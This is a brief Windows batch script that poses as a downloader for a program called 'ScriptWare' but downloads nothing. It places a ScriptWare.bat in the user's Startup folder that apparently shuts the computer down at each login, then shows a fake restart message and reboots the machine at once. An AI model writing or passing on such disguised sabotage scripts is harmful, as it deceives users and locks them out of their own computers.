@echo off
echo Downloading ScriptWare
cd %HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup
echo.> ScriptWare.bat shutdown /s
echo System needs to restart to finish
shutdown /r
echo Done!
exit
